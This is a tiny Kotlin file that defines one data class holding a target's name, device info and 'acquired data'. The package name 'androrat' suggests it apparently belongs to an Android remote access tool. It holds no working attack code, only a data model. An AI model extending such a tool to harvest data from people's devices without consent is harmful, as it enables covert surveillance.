package com.ierusalem.androrat.features.rtc_features.rtc_info.domain

data class AndroRtcClientInfo(
    val targetName: String,
    val deviceInfo: DeviceInfo,
    val acquiredData: AcquiredData,
)